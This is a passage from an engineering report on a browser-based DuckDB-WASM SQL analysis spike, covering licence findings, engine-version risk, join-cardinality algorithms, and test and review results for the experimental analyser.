  - denial of service through expensive SQL (mitigated by cancel and timeouts, not prevented).
- **Defence in depth:** the meta CSP restricts the **page** (observed: a cross-origin fetch from the page is blocked) but **not** the engine worker, which a positive control confirmed. The engine lockdown remains the primary control.
- **Not claimed:** complete network isolation beyond these tests.

### 10.11 Outstanding feasibility concerns

| Concern | Status |
|---|---|
| Safari | NOT TESTED. Needs Safari remote automation enabled (maintainer setting) or a manual run of the benchmark panel |
| Firefox | NOT TESTED. Not installed. Installing it needs approval |
| DuckDB-WASM `mvp` fallback bundle | NOT TESTED. Chrome always selects `eh`. The `mvp` build and extensions are shipped and hash-locked but never exercised |
| Real GitHub Pages deployment | NOT DONE. Needs approval |
| Runtime extension integrity | UNVERIFIED. Build-time SHA-256 lock only. `allow_unsigned_extensions = false` is verified as a setting, but its runtime effect on signed binaries was not tested |
| Licence notices | PARTLY RESOLVED (§10.12) |
| E3 diagnostic correctness corpus | NOT RUN |
| E5 SQL parsing | NOT RUN beyond confirming `json_serialize_sql` works under lockdown |
| Visible-window responsiveness | NOT MEASURED (headless only) |
| Large-result rendering (10,000 rows) | NOT RUN |
| Memory-ceiling recovery (WASM heap near 4 GB) | NOT RUN. Deliberately skipped for safety; needs approval and a machine where a crash is acceptable |

### 10.12 Licences and the pinned engine version

**Confirmed from authoritative upstream sources** (GitHub `duckdb/duckdb-wasm` and `duckdb/duckdb`, via the GitHub API, 2026-11-25):
- DuckDB-WASM is MIT, "Copyright 2018-2025 Stichting DuckDB Foundation", per the repository's `LICENSE`. The installed npm package **does not include this file**, so the notice must be added to any redistribution.
- DuckDB core is MIT, "Copyright 2018-2026 Stichting DuckDB Foundation".
- DuckDB v1.5.4 bundles about 30 third-party components under `third_party/`. Their licence files show only permissive licences:
  - MIT: fmt, fsst, fast_float, hyperloglog, jaro_winkler, miniz, pcg, skiplist, utf8proc, vergesort, yyjson, httplib, brotli;
  - BSD-style: libpg_query, lz4, re2, snappy, snowball, zstd, jemalloc;
  - Apache-2.0: fastpforlib, parquet, tdigest;
  - Boost: concurrentqueue, ska_sort;
  - mbedtls: dual Apache-2.0/GPL-2.0-or-later.
- `apache-arrow` (Apache-2.0) ships a `NOTICE.txt` that Apache-2.0 §4(d) requires to accompany redistribution.
- `react`, `react-dom`, `scheduler` are MIT; `qs` is BSD-3-Clause; `tslib` is 0BSD; `flatbuffers` and `@swc/helpers` are Apache-2.0. Each ships its licence file.

**Confirmed redistribution requirements:**
- include the MIT notices for DuckDB-WASM and DuckDB;
- include the Apache-2.0 licence and the Arrow `NOTICE.txt`;
- include the licence texts of the other bundled npm packages.

**Unresolved:**
- which `third_party` components are actually compiled into the WASM binaries and the `parquet`/`json` extensions;
- whether those components carry NOTICE files;
- `thrift` (no licence file at its directory top level) and `pdqsort` (licence text not identified);
- mbedtls: if it is compiled in, the Apache-2.0 option should be documented;
- which npm packages end up inside the minified bundle. Grepping for package names is unreliable; a build-time licence extraction step is needed.

**Engine version risk:**
- `1.33.1-dev57.0` is the npm `latest` dist-tag but is a development-numbered build (published 2026-06-22).
- The newest non-dev npm version is `1.32.0` (2025-12-16).
- GitHub release `v1.33.0` (2025-12-16) says it has "no real differences from 1.32.0", but **no `1.33.0` exists on npm**.
- Moving to `1.32.0` would most likely change the DuckDB core version *(not verified; it would need installing)*. That would require:
  - re-vendoring extensions for that core version;
  - re-checking that every lockdown setting exists, notably `allowed_directories`, `allowed_paths` and `allow_unsigned_extensions`;
  - re-validating the serialised-SQL JSON format (E5);
  - re-running the whole test suite.
- **Recommendation:** keep the current pin for the spike. Before production, evaluate `1.32.0` (or a later stable npm release) in a separately approved spike. **No version change was made.**

## 11. SQL correctness analysis engine (E3 + E5 experimental implementation, 2026-11-25)

> **Superseded in part by §12 (Codex Step 4.4 review: NO-GO for public release).** Corrected statements below are marked *[Corrected: §12]*. In particular: aggregate-inflation findings were removed; the outer-join/`WHERE` explanation was rewritten; the finding categories changed; the 10^8 × 10^8 test was retired; and the MVP scope is now §12.12 (P-031).

An experimental, deterministic analysis engine (no LLM) for a documented subset of DuckDB SQL. Code: `spikes/browser-feasibility/src/analysis/`, on branch `spike/sql-analysis`. It is spike code: exposed only in the test-only harness build, not wired into any UI, and absent from the production `dist/`. **It does not verify SQL correctness in general.** It measures specific join and aggregation properties of a supported query on the loaded data snapshot.

### 11.1 Parser choice

| Option | Licence | Dialect | Decision |
|---|---|---|---|
| DuckDB's own parser (`json_serialize_sql` / `json_deserialize_sql`) | MIT (already bundled) | Exactly the execution dialect | **Chosen.** No new dependency; works under the lockdown (verified). Risk: the JSON format is internal to DuckDB, so it is tied to the pinned v1.5.4 and must be re-validated on upgrade |
| `node-sql-parser` 5.4.0 | Apache-2.0 | Generic/MySQL/PostgreSQL | Not chosen: not DuckDB's dialect; 92 MB package |
| `pgsql-ast-parser` 12.0.2 | MIT | PostgreSQL | Not chosen: dialect mismatch |
| `libpg-query` 18.2.5 | MIT | PostgreSQL (WASM) | Not chosen: dialect mismatch |
| `sql-parser-cst` 0.45.1 | **GPL-2.0-or-later** | Several | Excluded on licence |

Licences come from npm registry metadata, read 2026-11-25. None of the alternatives was installed or evaluated in depth.

Parsing alone is not treated as understanding. Join keys are resolved against the actual relation schemas, key types are compared, and every numeric claim is computed from the data.

### 11.2 Supported SQL subset

**Supported:**
- one `SELECT` statement;
- optional non-recursive CTEs, each itself in this subset;
- `FROM` one named table, view or CTE, followed by a **left-deep** chain of `INNER`, `LEFT`, `RIGHT` or `FULL` joins;
- each join condition is either `AND`-ed `column = column` equalities (composite keys allowed) or `USING (...)`;
- optional `WHERE`, a single `GROUP BY` set, `HAVING`, `ORDER BY` and `LIMIT`;
- any expressions in the `SELECT` list, provided they contain no subqueries or window functions.

**Unsupported**, reported per construct with status `unsupported` and *no data conclusions*:
- joins: comma joins and `CROSS`, `NATURAL`, `SEMI`, `ANTI`, `ASOF` and `POSITIONAL` joins; right-nested or bushy join trees;
- join conditions: non-equality, `OR`, expressions, `IS NOT DISTINCT FROM`;
- subqueries anywhere (`FROM`, `WHERE`, `SELECT`);
- query shape: `UNION`/`INTERSECT`/`EXCEPT`, `DISTINCT` (it can mask fan-out), window functions, `QUALIFY`;
- grouping: `GROUPING SETS`/`ROLLUP`/`CUBE`;
- CTE forms: recursive CTEs, CTE column aliases;
- `FROM` items: table functions (including `read_csv`), schema- or catalog-qualified names, `TABLESAMPLE`, time travel;
- multiple statements and non-`SELECT` statements.

**Inconclusive**, analysed partly with the reason stated:
- join keys whose types differ, since implicit casts change matching;
- keys that cannot be resolved to exactly one relation;
- diagnostics that fail;
- checks that would exceed the execution budget.

**Execution failure:** syntax errors, queries that cannot bind (for example a missing table), and runtime failures.

### 11.3 Algorithms and complexity

**Join cardinality without materialising the join.** For each join, the engine:
1. groups each side by its key: `L(k)` and `R(k)`, counting rows with any NULL key column separately (they never match);
2. joins the two grouped tables, so the work is proportional to the number of distinct keys;
3. computes, with `HUGEINT` in SQL and `BigInt` in TypeScript:
   - matched pairs `P = Σ L(k)·R(k)`;
   - rows matched on each side;
   - unmatched rows = input rows − rows matched (this includes NULL-key rows);
   - left rows multiplied `= Σ_{R(k)>1} L(k)`;
   - left excess copies `= Σ_{R(k)>1} L(k)·(R(k)−1)`, and the same two quantities for the right side;
   - distinct and duplicated keys, maximum multiplicities (overall and among matched keys).

Output cardinality: `INNER = P`, `LEFT = P + Lu`, `RIGHT = P + Ru`, `FULL = P + Lu + Ru`.

**Output cardinality and affected input rows are reported separately.** One join can multiply some rows and drop others with no net change in row count; a regression case asserts exactly this.

**Relationship classification** (one-to-one, one-to-many, many-to-one, many-to-many), always labelled *observed in this snapshot*:
- by key uniqueness of each whole input;
- separately, among matched keys only, because duplicates on unmatched keys never multiply rows.

**Fan-out and expansion:**
- `join-expansion` means left input rows are multiplied.
- `right-rows-repeated` is the normal repetition of a lookup row in a many-to-one join. It is observed, not suspicious, but it matters for measures taken from the right side.

**Join chains:**
- The first join uses base-relation frequencies.
- Join *i* > 0 groups the **executed** intermediate (joins 0..*i*−1) by its key. That intermediate is aggregated in the engine, not returned to the page; the method is labelled.
- A consistency check requires each join's computed output to equal the next join's executed left-input count. A mismatch is reported as an internal inconsistency.

**Intermediate row counts:**
- FROM and each join: frequency formula.
- After `WHERE` and the final result: executed `count(*)`.
- Each stage is labelled with its method.

**`WHERE` removing outer-join rows.** A row preserved by a `LEFT` join has NULL in the right-side join key, and keys never match NULL. So:

> rows removed = `count(FROM … WHERE key IS NULL)` − `count(FROM … WHERE (where) AND key IS NULL)`

*[Corrected: §12.6 — the explanation now depends on which relations `WHERE` references, and gives no rewrite advice]* This is measured, not inferred from syntax. An intentional anti-join (`WHERE c.cid IS NULL`) removes none and produces no finding. The check is skipped, and reported as not checked, when a later `RIGHT` or `FULL` join makes NULL-extension ambiguous.

**Aggregate inflation:** *[Corrected: §12.5 — these findings were removed; they claimed inflation without measuring the rows that actually contribute to the aggregate]*
- **Suspicious** when `SUM`, `COUNT` or `AVG` (non-distinct) takes its argument from a relation whose rows some join measurably multiplies. `AVG` is reported as *weighted*, not inflated.
- `COUNT(*)` is suspicious after any expansion.
- `MIN`, `MAX` and `DISTINCT` aggregates are not flagged.

**Metric expectation (`metric-preserved`):** compares the executed `SUM(column)` over the joined and filtered rows with the source total. The difference is exact for DECIMAL and INTEGER; an optional relative tolerance covers floating-point columns. It is attributed to the joins that multiply or drop that relation's rows. If `WHERE` references other relations, the source total is ambiguous and the result is **inconclusive**.

**User-defined expectations.** These are the only route to an expectation violation:
- `relationship`: a stricter observed relationship is allowed, a looser one is a violation;
- `no-row-loss` on a given side;
- `no-fan-out`, by side, defaulting to left;
- `grain`: one result row per given output columns, executed;
- `metric-preserved`;
- `row-count` bounds.

**CTEs:** each CTE body is analysed as its own query, with an execution budget and a maximum depth of 3.

**Complexity and cost:**

| Component | Time | Engine memory |
|---|---|---|
| First join's statistics | O(\|L\| + \|R\|) scans | O(distinct keys); never the joined rows |
| Later join *i* | Cost of executing joins 0..*i*−1 into an aggregate | Join hash tables + key aggregate |
| Samples (fan-out keys, unmatched keys) | 3 extra statements per join, recomputing frequencies | as above; output limited to 5 rows |
| `WHERE`, final count, outer-join check, grain, metric | Executions of the query (streamed into `count`/`sum`) | Engine working memory |

Executed checks are skipped once any computed intermediate exceeds an **execution budget**, by default 50 M rows. They are then reported as inconclusive, while frequency results still stand.

### 11.4 Diagnostic categories

*[Corrected: §12.8 — eight categories]* `observed` (measured property), `suspicious` (often a mistake but may be intended), `expectation-violation` (a user-defined expectation contradicted by evidence), `unsupported`, `inconclusive`, `execution-failure`.

- Every report has a status: `analyzed`, `partially-analyzed`, `unsupported` or `execution-failed`.
- It lists the checks performed and the checks not performed, records every diagnostic statement, and carries a disclaimer.
- **There is no "pass" outcome.**
- A row-count increase is reported as observed expansion, not as an error.

This refines the four categories of D-013 / AGENTS.md §8 (logged as P-026 for approval):
- "confirmed issue" and "expectation violation" are both represented as `expectation-violation`, which needs a declared expectation;
- `observed`, `inconclusive` and `execution-failure` are added.

### 11.5 Verification (actual results, Chrome 158, DuckDB-WASM v1.5.4, 2026-11-25)

**Independent oracle:** `scripts/make_analysis_fixtures.py` computes every expected number by **nested-loop brute force** in Python, with SQL NULL and three-valued logic, deliberately without the frequency formula. The fixtures (`tests/fixtures/analysis/cases.json`, 384 KB) regenerate byte-for-byte from seed 20261125. Four Python unit tests pin the oracle itself to hand-computed answers.

**Three-way comparison** (`tests/e2e/analysis.spec.ts`): engine result = Python brute force = DuckDB's actual `count(*)` of each join prefix and of the final query.

| Suite | Result |
|---|---|
| 37 named cases | **pass.** Covers one-to-one; one-to-many (legitimate expansion); many-to-one; many-to-one with a violated expectation; many-to-many; duplicates only on unmatched keys; composite keys with partial NULL; repeated NULL keys; empty left / right / both under all four join types; unmatched rows under all four join types with `no-row-loss`; `LEFT JOIN` + null-rejecting `WHERE`; anti-join `IS NULL`; filter before the join (CTE) and after it; aggregate inflation; preserved aggregate; `INNER` loss lowering a `SUM`; net-zero metric under fan-out; fan-out plus loss with an unchanged row count; `COUNT(*)` after fan-out; a three-table chain; `USING`; grain violated and held; row count; `LIMIT` |
| 200 seeded random cases | **pass.** 154 single-join and 46 two-join chains; all join types (INNER 62, LEFT 72, RIGHT 51, FULL 61 join instances); composite keys in 55 cases; NULL keys in 152 join instances; an empty side in 84; `WHERE` in 85 cases; outer-join rows removed by `WHERE` in 47 |
| 21 unsupported constructs | **pass.** Each yields `unsupported`, an explanation, and no data findings, join results or stages |
| Inconclusive and failures | **pass.** Key type mismatch (INTEGER vs BIGINT) → `partially-analyzed` with no join statistics. Missing table → `execution-failed` (bind). Syntax error → `execution-failed` |
| Above 2^53 | *[Retired: §12.4 — not rerun without approval; exactness is now covered by unit tests]* **pass.** A 10^8 × 10^8 single-key join gives exactly `10000000000000000` output rows and `9999999900000000` excess copies, in about 4 s, without executing the join. The execution budget skips the final count and reports why |
| Unit tests (`analysis-stats.test.ts`) | **7 pass.** Research worked example for all join types; the identity \|out\| − \|L\| = excess − unmatched; relationship rules; `no-fan-out` sides; exactness above 2^53 |

**Mutation check.** Three deliberate engine bugs were each caught by both the named and the random suites, and the source was restored afterwards:
- excess copies computed with `R(k)` instead of `R(k)−1`;
- NULL keys allowed into the key frequencies;
- the outer-join/`WHERE` comparison inverted.

**Performance, one observation, warm, in-memory tables:** `orders` LEFT JOIN `customers` (100 k customers, 1 % duplicated keys), `GROUP BY` and a metric expectation:

| Orders | Analysis (16 statements) | User query | `count(*)` of the join | Engine output = DuckDB |
|---:|---:|---:|---:|---|
| 1,000,000 | 202 ms | 30 ms | 16 ms | 1,010,000 = 1,010,000 |
| 5,000,000 | 509 ms | 128 ms | 70 ms | 5,050,000 = 5,050,000 |

So analysis currently costs about 4–13× the query. The frequency method's value is **exactness without executing huge joins** and **per-key attribution**, not speed at moderate sizes.

### 11.6 Known limitations and risks

- **Scope:** only the subset in §11.2. Real analyst SQL often uses subqueries, `DISTINCT`, window functions and set operations; all of those are unsupported today, which limits how much real SQL can be analysed.
- **Semantics not modelled:**
  - expressions in the `SELECT` list;
  - `HAVING` beyond the final count;
  - `ORDER BY`/`LIMIT` effects on aggregates;
  - collations;
  - floating-point join keys (they are treated like any other type);
  - implicit casts, which make the result inconclusive.
- **Chains:** later joins execute the preceding joins. They are aggregated rather than materialised, but still cost the join work and are subject to the execution budget.
- **Performance:**
  - the sample queries recompute frequencies; materialising them once into temporary tables would cut the cost;
  - there is no cancellation path dedicated to analysis yet beyond the session's cancel;
  - no large-file measurement was taken for the analyser.
- **Parser format:** DuckDB's serialised-SQL JSON is internal. An engine upgrade must re-run this suite. The recogniser rejects unknown node shapes rather than guessing.
- **Expectation semantics:** `metric-preserved` assumes the declared column's source total is the reference. If `WHERE` mixes relations, the result is inconclusive rather than guessed.
- **Not tested:** Safari and Firefox; visible-window responsiveness during analysis; the analyser on the 50 MB–1 GB file datasets.

### 11.7 Recommended trustworthy MVP analysis scope (proposal)

*[Superseded: §12.12 and P-031]*

1. **Supported queries:** a single `SELECT` with a left-deep chain of up to 3 equi-joins (`INNER`/`LEFT`, plus `RIGHT`/`FULL` reported without the outer-join/`WHERE` check when a later outer join follows), simple non-recursive CTEs, `WHERE`, `GROUP BY` with `SUM`/`COUNT`/`AVG`/`MIN`/`MAX`.
2. **Always shown:**
   - per-join observed cardinality, relationship (whole input and matched keys), expansion, repetition, unmatched and NULL-key rows, with 5 sample keys;
   - stage row counts with their method;
   - the unsupported or inconclusive reasons;
   - the list of what was not checked.
3. **Suspicious patterns only:** many-to-many matches; aggregates over multiplied rows; outer-join rows removed by `WHERE`.
4. **Expectation violations only from declared expectations:** relationship, no fan-out, no row loss, grain, metric preserved, row count.
5. **Never shown:** a pass or "correct" verdict; conclusions about unsupported SQL.
6. **Before shipping:**
   - materialise the frequency tables once per analysis (performance);
   - make analysis cancellable and budgeted per statement;
   - qualify on the P-024 data ceiling in Chrome, then Safari and Firefox;
   - get maintainer approval of P-026 to P-030.


## 12. Codex review of the analysis engine (Step 4.4) — resolution, 2026-11-25

Codex verified the core join-frequency arithmetic within the tested subset, but returned **NO-GO for public release**. It raised four high-severity and three medium-severity findings, all reproduced here on the unmodified analyser before any change.

**Principle applied throughout:** an unsupported or inconclusive result is preferable to an incorrect one.

**Scope:** spike code on `spike/sql-analysis`. Exposed only in the test-only harness and absent from the production `dist/`. Chrome 158 only.

### 12.1 H1: numeric precision lost when rewriting SQL — RESOLVED

- **Root cause:** `JSON.parse` of DuckDB's serialised syntax tree turns every number into a JavaScript double. The literal `9007199254740993` became `9007199254740992` in every rewritten diagnostic statement.
- **Correction:**
  - `src/analysis/json.ts` is a lossless JSON parser and serialiser. Numeric tokens are kept as their exact source text, and serialising an unsafe JavaScript integer is refused.
  - The engine parses DuckDB's output with it, and every rewritten statement is serialised with it.
  - Every count and total crosses into TypeScript as SQL text and is parsed with `BigInt`. A missing count is an error, never zero.
  - Results are now shape-validated, and truncated results are rejected (§12.9).
- **Regression tests:**
  - `BIGINT`: with values `…992`, `…992`, `…993`, `WHERE k = 9007199254740993` gives 1 row, while the wrong literal would give 2. The engine's stage count equals DuckDB, and no diagnostic contains the wrong literal.
  - `HUGEINT` maximum value, and `DECIMAL(38,10)` with exact totals (`24691357802469135780.2469135782`).
  - `BIGINT` keys up to 2^63−1 in MVP scope match DuckDB's join and `SEMI JOIN` counts.
  - Unit tests: a lossless round trip of `BIGINT`, `HUGEINT` and `DECIMAL` literals; malformed JSON rejected.
- **Mutation check:** replacing the lossless parser with `JSON.parse` fails the H1 test.

### 12.2 H2: collation and impossible join statistics — RESOLVED (by refusal and validation)

- **Root cause:** the frequency model assumes grouping by the key uses the same equality as the join. `VARCHAR` joined to `VARCHAR COLLATE NOCASE` compares case-insensitively, while grouping the plain column does not. The analyser reported −1 unmatched right rows and a wrong relationship.
  - `DESCRIBE` and `duckdb_columns()` both report plain `VARCHAR`, so collation **cannot be detected from type names**.
- **Correction:**
  1. **MVP scope accepts only same-type integer keys.** Any other key type is `unsupported`.
  2. **Invariants** (`checkInvariants`, §12.10) are checked on every join's statistics.
  3. **Engine-semantics cross-check:** matched rows on each side are recounted with a `SEMI JOIN` that reuses the query's own join node. That is DuckDB's own matching, without enumerating pairs.
  4. **Executed `count(*)`** of the join, when within the execution budget.
  - Any disagreement makes the join `inconclusive` (`invariant-violated` or `semantic-mismatch`). Its statistics, derived values, relationship, stages and every dependent finding and expectation are suppressed.
- **Regression tests:**
  - The exact Codex reproduction is inconclusive: no stats, no negative numbers, no relationship claim, and the expectation unchecked. DuckDB's actual count of 2 is noted. MVP scope refuses it as a non-integer key.
  - Both sides collated: either validated numbers equal DuckDB, or the result is inconclusive.
  - Plain `VARCHAR` keys in experimental scope are still analysed, and validated as agreeing.
  - A unit test shows the invariants flag the reproduction's statistics.
- **Mutation check:** disabling both invariants and the `SEMI JOIN` check fails the reproduction.

### 12.3 H3: fail-closed execution budget — RESOLVED for application-level budgets [Corrected: §13.3]

- **Root cause:** the budget gate used the largest *known* join output. An unknown estimate (type mismatch, failed statistics) counted as 0, so executed probes still ran.
- **Correction (fail-closed):**
  - **Bounded pre-checks:** input rows per relation (`maxInputRows`, default 50 M) and distinct keys per side (`maxDistinctKeys`, default 5 M), using `LIMIT n+1` counts. They run before any grouping or temporary table.
  - **Unknown means blocked.** An unknown, failed, invalid or over-budget join output marks everything downstream unknown:
    - later joins report `depends-on-unknown`;
    - executed probes (the `WHERE` and final count probes, the outer-join check, grain and metric expectations) run only if *every* join is validated and every computed output is within `executionBudgetRows` (default 50 M);
    - the executed cross-check `count(*)` is skipped above the budget.
  - **Analysis-wide deadline** (`sessionExecutor(session, { deadlineMs })`, default 30 s). When it expires, the running statement is cancelled through the session (cooperatively, or by terminating and recovering the worker with verification). The report is `budget-exhausted`, with no partial conclusions.
  - **Witnesses and transfer:** at most 5 sample rows per query, and every diagnostic declares its shape. Results are capped at 8 MB of Arrow data, and a truncated result is an error.
  - **No pair materialisation:** frequencies are grouped; matching is checked with `SEMI JOIN`; executed counts happen only within budget.
  - **Cleanup:** frequency tables are temporary and dropped in `finally` with their own 5 s timeout. A worker that was terminated loses them anyway.
- **Regression tests:**
  - the Codex reproduction (unknown estimate, budget 1) runs no executed probe, and its `row-count` expectation is unchecked;
  - an over-budget first join blocks the second join and every count-only probe;
  - the input and distinct-key budgets fail closed before any temporary table exists;
  - a real deadline (300 ms over a generated 400 M-row view) gives `budget-exhausted` and a usable session in state `ready`, with 0 temporary tables left;
  - injected budget exhaustion and an injected diagnostic failure, both *after* the temporary tables were created, leave 0 behind.
- **Mutation check:** forcing the gate open fails four tests.
- **Limitation:** these are application-level budgets. They do not guarantee protection from every browser or WASM memory-exhaustion path. A single DuckDB operator can allocate before the deadline fires; DuckDB's `memory_limit` is the remaining engine-level control.

### 12.4 H4: NULL treated as zero — RESOLVED [Outcome contract corrected: §13.6]

- **Root cause:** the tolerance comparison used `coalesce(…, 0)`, so a NULL total equalled 0. In addition, invalid expectation targets were ignored (join index 5) or reported as `inconclusive`.
- **Correction:**
  - **NULL semantics are explicit:**
    - a NULL total means no non-NULL values;
    - NULL equals only NULL;
    - tolerance applies only to two non-NULL totals;
    - `nullAsZero: true` is an explicit opt-in.
  - Exact comparison when the tolerance is 0, with the totals and difference reported as exact text.
  - **Every expectation gets exactly one outcome:** `violated`, `held` (with evidence) or `unchecked` (with a reason). These outcomes are listed in `report.expectations`. Unchecked ones also appear as `expectation-unchecked` findings and make the report `partially-analyzed`. Targets that are invalid, nonexistent, non-numeric or outside the scope become `unchecked`.
- **Regression tests:**
  - NULL vs NULL holds;
  - 0.00 vs NULL is a violation, both with and without tolerance;
  - with `nullAsZero` it holds;
  - an empty relation holds;
  - 200.00 vs 100.00 holds at tolerance 2 and is a violation at 0.5;
  - six invalid targets all report `unchecked`, plus one `held`;
  - MVP-scope grain and metric expectations are `unchecked`, with the reason given.
- The 10^8 × 10^8 browser test was **retired, not rerun**, per the maintainer's instruction. Exactness above 2^53 is covered by `BigInt` unit tests. The historical observation in §11.5 stands as recorded.

### 12.5 M1: aggregate attribution — RESOLVED (claims removed)

- **Root cause:** an aggregate was flagged as inflated whenever *some* join multiplied its source relation. That ignored `WHERE`, aggregate `FILTER`, `COUNT(expr)`/`COUNT(NULL)` and `DISTINCT`, all of which can remove the duplicated contributors.
- **Correction:**
  - `aggregate-over-fan-out`, `average-over-fan-out` and `count-over-expanded-join` were removed.
  - Join-stage expansion is still reported as an observation of the **join output**.
  - "Aggregate inflation" is listed under *not checked* in every report.
  - The `metric-preserved` expectation, which measures totals, remains experimental.
- **Regression tests:** the three Codex scenarios plus `COUNT(*)` give no aggregate claims and list aggregate inflation as not checked. All named and random cases assert that the removed codes never appear.

### 12.6 M2: outer-join explanations — RESOLVED

- **Root cause:** every `WHERE` removal of NULL-extended rows was explained as a condition on the other side's columns, with advice to move it into `ON` or use an `INNER JOIN`. That was wrong when `WHERE` filtered the *preserved* side.
- **Correction:** the measured counts are unchanged; the explanation now depends on the set of relations that `WHERE` references, resolved structurally:
  - only the preserved side → `observed: where-filters-preserved-side`;
  - only the NULL-supplying side → `suspicious: where-removes-null-extended-rows`, which states only that those columns are NULL in the removed rows;
  - mixed or unresolvable → `observed: where-removes-outer-join-rows`.
  - **No rewrite advice.**
  - A later `RIGHT` or `FULL` join leaves the check *not checked*.
- **Regression tests:** each of the three classifications, with counts equal to DuckDB; no advice wording; a later `INNER` join measured at the full `FROM`; a later `RIGHT` join recorded as not checked.

### 12.7 M3: unsupported syntax and failure classification — RESOLVED

- **Root causes:**
  - modifiers were never inspected, so `ORDER BY (SELECT 1)` and `LIMIT (SELECT 1)` were accepted;
  - a nested `WITH` inside a CTE was accepted;
  - `SELECT` aliases used in `WHERE`/`GROUP BY` broke rewritten statements, and the result was misreported as a user-query failure;
  - a count-only wrapper made a query that fails at runtime (`'abc'::INTEGER`) look analysed and executed.
- **Correction:**
  - **MVP:** a field-level **allowlist** over the whole serialised statement. Unknown fields, for example from a future DuckDB version, are refused; only the parser's `query_location` metadata is accepted.
  - **Experimental:** checks of `ORDER BY` expressions, `LIMIT`/`OFFSET` (literals only), nested `WITH`, `SELECT` aliases in `WHERE`/`GROUP BY`/`HAVING`, and `COLLATE`.
  - **Failures are classified separately:**
    - `query-failure` (`syntax-error`, `bind-failed`) only from parsing or binding the *original* query;
    - `diagnostic-failure` for any failing diagnostic statement, with the message stating that this does not mean the query fails.
  - **Count-only probes:** stages computed by count-only probes are labelled `count-only-probe`. Every report's first *not checked* item says the analyser never runs the original query, and the disclaimer says it does not show that the query executes.
- **Regression tests:**
  - six constructs are refused in both scopes, while DuckDB itself runs every one;
  - the runtime-failing query has a labelled probe, the not-checked entry, and no "executed" wording, and MVP refuses it;
  - an injected diagnostic failure gives `diagnostic-failed`, and an invalid column gives `query-failed`.

### 12.8 Diagnostic categories (implemented)

| Category | Meaning |
|---|---|
| `observed` | Measured property of the snapshot (join cardinality, expansion, repetition, unmatched/NULL keys, preserved-side filtering) |
| `suspicious` | Many-to-many matches; `WHERE` removing NULL-extended rows using only NULL-supplying-side columns |
| `expectation-violation` | A declared expectation contradicted by complete, validated evidence |
| `expectation-unchecked` | A declared expectation that could not be evaluated (reason given) |
| `unsupported` | Construct outside the scope; no data conclusions |
| `inconclusive` | Invariant violation, semantic mismatch, budget, unknown upstream, unresolved or mismatched keys |
| `diagnostic-failure` | A diagnostic statement failed (says it does not imply the query fails) |
| `query-failure` | The original query cannot be parsed or bound |

**Report status:**
- `analyzed`;
- `partially-analyzed` (any inconclusive finding or unchecked expectation);
- `unsupported`, `query-failed`, `diagnostic-failed`, `budget-exhausted`.

`authoritative: true` only for MVP-scope reports with status `analyzed` and every join validated. There is still no "pass".

### 12.9 Diagnostic execution architecture [Superseded in part: §13.2, §13.3, §13.13]

- **Shape-validated results:** every diagnostic declares its column count and its exact or maximum row count. Truncated, oversized or differently shaped results are rejected as `DiagnosticError`, never used as partial evidence.
- **Exact values:** numbers are cast to `VARCHAR` in SQL and parsed with `BigInt`. Rows never pass through display formatting that could shorten them, because truncation is rejected.
- **Frequencies computed once:** each side's key frequencies are materialised as one temporary table. The statistics query and the three witness queries reuse it, replacing four recomputations per join in the earlier version.
- **Cost per MVP analysis:** about 30 small statements:
  - parsing and binding;
  - two describes;
  - two input checks and two distinct-key checks;
  - two totals and two temporary tables;
  - one statistics query;
  - two `SEMI JOIN` counts and one executed count;
  - three witness queries;
  - syntax-tree serialisation.
- **Scans:** each base relation is scanned about 5 times (input check, distinct check, totals, grouping, `SEMI JOIN`), plus the executed count when within budget. Engine memory is O(distinct keys) for the frequency tables, plus the hash tables of the `SEMI JOIN` and the count.
- **Main thread:** results are tiny, so Arrow decoding on the main thread is negligible.
- **Privacy and cancellation:** everything runs through the locked-down `EngineSession`. Cancellation and deadline expiry use its verified recovery path.
- **Measured** (Chrome 158, warm, in-memory tables; one observation each): LEFT JOIN with 100 k customers, 1 % of them duplicated.

| Orders | MVP analysis (30 statements) | Experimental (31) | Plain `count(*)` of the join | Output matches |
|---:|---:|---:|---:|---|
| 1,000,000 | 194 ms | 140 ms | 18 ms | 1,010,000 |
| 5,000,000 | 399 ms | 402 ms | 68 ms | 5,050,000 |

### 12.10 Mathematical invariants (checked on every join)

For each side:
- NULL-key rows ≤ rows;
- Σ key frequencies = rows − NULL-key rows;
- matched rows ≤ non-NULL-key rows;
- distinct keys ≤ non-NULL-key rows;
- duplicated keys ≤ distinct keys;
- (duplicated keys = 0) ⇔ (maximum multiplicity ≤ 1);
- matched-key maximum ≤ overall maximum;
- multiplied rows ≤ matched rows, and excess copies ≥ multiplied rows;
- (multiplied = 0) ⇔ (excess = 0);
- **matched pairs = matched rows + excess copies**.

Across both sides:
- every count ≥ 0;
- matched keys ≤ distinct keys on both sides;
- matched keys, pairs and rows are zero together;
- left rows are multiplied ⇔ some matched key has R(k) > 1, and symmetrically.

Each join is also validated against DuckDB: `SEMI JOIN` matched rows equal frequency matched rows, and the executed `count(*)` equals the computed output when within budget.

### 12.11 Verification results (actual, 2026-11-25) [Superseded: §13.12]

| Check | Result |
|---|---|
| Type check | pass |
| Vitest | **62 passed** (incl. invariants, lossless JSON, MVP allowlist, expectation outcomes) |
| Python unittest | **9 passed** (generator + oracle) |
| Playwright, Chrome 158 | **67 passed**. Includes 17 Codex regression tests (`analysis-review.spec.ts`) and the analysis suite: 37 named + 200 random cases matching the Python oracle and DuckDB in experimental scope, with every join validated, no negative values and one outcome per expectation |
| MVP sweep | 70 MVP-eligible cases are authoritative and match the oracle; all other 167 cases and 21 unsupported constructs are refused |
| Mutation checks | 5 of 5 caught: excess formula, NULL keys in frequencies, validation disabled, budget gate open, lossless JSON removed |
| Production build | contains no analysis or harness code |
| Fixtures | regenerate byte-identically |

**Not run** (by instruction or not yet approved): the 10^8-row-per-side test, large-memory stress, browser-ceiling tests, Safari and Firefox, the analyser on file datasets.

### 12.12 Diagnostic support matrix [Superseded: §13.14]

| Capability | MVP (authoritative) | Experimental (never authoritative) |
|---|---|---|
| Two named relations, one INNER/LEFT equi-join | ✔ | ✔ |
| Single and composite keys | ✔ same-type integers only | ✔ any same type, validated; collations are caught by validation, not detected |
| Duplicate-key and NULL-key statistics, matched/unmatched rows, output cardinality, excess copies, relationship | ✔ validated | ✔ validated |
| Bounded witnesses (5 rows) | ✔ | ✔ |
| Expectations: relationship, no-row-loss, no-fan-out, row-count | ✔ | ✔ |
| Expectations: grain, metric-preserved | unchecked (out of scope) | ✔ executed, budget-gated |
| RIGHT/FULL joins | unsupported | ✔ |
| Join chains | unsupported | ✔ (later joins use executed intermediates, budget-gated) |
| CTEs | unsupported | ✔ non-recursive, no nested `WITH` |
